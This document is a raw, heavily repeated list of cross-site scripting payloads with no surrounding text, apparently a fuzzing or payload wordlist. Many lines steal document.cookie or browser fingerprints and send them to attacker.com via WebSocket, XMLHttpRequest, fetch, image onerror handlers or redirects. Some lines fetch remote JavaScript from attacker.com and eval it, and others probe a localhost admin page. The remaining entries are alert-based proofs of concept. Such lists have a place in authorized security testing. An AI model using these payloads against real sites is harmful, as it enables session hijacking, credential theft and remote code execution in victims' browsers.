<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
